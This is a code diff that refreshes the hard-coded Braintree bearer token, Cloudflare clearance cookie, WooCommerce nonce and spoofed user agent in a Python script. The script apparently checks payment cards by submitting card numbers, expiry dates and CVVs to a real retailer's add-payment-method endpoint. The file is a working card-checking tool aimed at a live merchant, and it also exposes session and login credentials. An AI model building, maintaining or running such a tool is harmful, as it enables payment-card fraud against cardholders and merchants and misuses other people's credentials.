@@ -113,7 +113,7 @@ def tokenize_and_auth_card(card_number, exp_month, exp_year, cvv):
         
         headers = {
             'accept': '*/*',
-            'authorization': 'Bearer eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjkzNTM0NDcsImp0aSI6IjAwOWYwZGRhLWU4MWMtNGJiYS05ZjgzLTZlNjc1MjUzYTJhMSIsInN1YiI6ImRxaDVueHZud3ZtMnFxamgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImRxaDVueHZud3ZtMnFxamgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJiZXN0b3BwcmVtaXVtYWNjZXNzb3JpZXNncm91cF9pbnN0YW50IiwicGF5cGFsX2NsaWVudF9pZCI6IkFhbmJtNXpHVC1DTWtSNUFKS0o5UjBMa3RQcWxYSW96RENDNTNMQ2EyM3NBVXd0akRBandHM3BsVG1HNy1EanRSM2NGdXZwNEpKLUZ3VjVlIn19.kO7xjhUIvYLFB-oXC8pTFZyAosxcnxbbkHV4m9yzVYy59RVhi-DwS7H5iKE-RDivaVXW_kf4OhxLXPWIXdrCXQ',
+            'authorization': 'Bearer eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3Njk1MTM5NjksImp0aSI6ImEyZTMyMWZhLTI0NWItNDc4Yi1iYTE4LWNiZDEyNzcxMGZhNiIsInN1YiI6ImRxaDVueHZud3ZtMnFxamgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImRxaDVueHZud3ZtMnFxamgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJiZXN0b3BwcmVtaXVtYWNjZXNzb3JpZXNncm91cF9pbnN0YW50IiwicGF5cGFsX2NsaWVudF9pZCI6IkFhbmJtNXpHVC1DTWtSNUFKS0o5UjBMa3RQcWxYSW96RENDNTNMQ2EyM3NBVXd0akRBandHM3BsVG1HNy1EanRSM2NGdXZwNEpKLUZ3VjVlIn19.kq0SGfoXL0uiBjkAJG_MYItjOTYXTZtATI7DLNyvKelIdxsRcF3gRKyrHQ2Exi5eiKk2wsHGxXMN-W4hc1dRSw',
             'braintree-version': '2018-05-10',
             'content-type': 'application/json',
             'origin': 'https://www.calipercovers.com',
@@ -199,7 +199,7 @@ def add_payment_method(payment_nonce):
         log("🌐 Connecting to Calipercovers...", "info")
         
         cookies = {
-            'cf_clearance': 'tHJrB9UvvtAIKW.xqvdHjU9FocbzlM9Ta0oG44zMh9I-1769266581-1.2.1.1-F9NITE7UaWHVWo7m7luX3AQx5H2PVNeaHdzwtpsFKGDaAqM5w3vLdupV5AyVUbtEAzqPcTpU0fa42tEp6WDlyUQuVdHU2MXcPPhAU.n8Yx8b_.pA6SyEYGqW03aj4MEGv4de8LjPrNWhKl2Hb_nprDTqL_JNr3PvlFFw60lp50UO5Cjw3wrcUPF2ap.70reT3jGOd_PZh3OoFdM1VSt0cP1QSolsMWM3AbDchggRwv0',
+            'cf_clearance': '8SJFahJF3xao87zBesKaIQZm.TLAuwMFwqBnoXAkwzI-1769427572-1.2.1.1-7eLQ5SJn.CDUMuDNTUkDyJMzSsiaMKAN1Tksw_KFeKI1DzL.5z3m08f3CGdGtzp9ZEKjxD4FtpsdJxDje4Ird8w10x1kpPLvrODx2mSffQCzZ03gIMudmRE_w2zaYxAOpzLkevKHQ5Dk_nhFpEgVmv967JUHjW7C4i7k9SRYv_TqtqB4kEcDdonp29xehTmiXPb1tcTtGuQhU2O7iaIWliGq4YDDshcKClpQ5Q11Os4',
             'wordpress_logged_in_9a06d022e5a0d800df86e500459c6102': 'ocpqwkhavbg%7C1769782031%7Cz1TsZVK7QMfHQOY5r7UswfuAeNFn4Y8pE8A0aMeYfms%7C7aa136fcbfb94bac8d5f4c2ded7594eb57043ad30ec26d6d2c448c9cc0c54033',
         }
         
@@ -208,7 +208,7 @@ def add_payment_method(payment_nonce):
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://www.calipercovers.com',
             'referer': 'https://www.calipercovers.com/my-account/add-payment-method/',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
         }
         
         data = {
@@ -217,7 +217,7 @@ def add_payment_method(payment_nonce):
             'braintree_cc_device_data': f'{{"device_session_id":"{int(time.time())}","fraud_merchant_id":null}}',
             'braintree_cc_3ds_nonce_key': '',
             'braintree_cc_config_data': '{"environment":"production","merchantId":"dqh5nxvnwvm2qqjh"}',
-            'woocommerce-add-payment-method-nonce': 'f556b42d06',
+            'woocommerce-add-payment-method-nonce': '16caf4c22e',
             '_wp_http_referer': '/my-account/add-payment-method/',
             'woocommerce_add_payment_method': '1',
         }
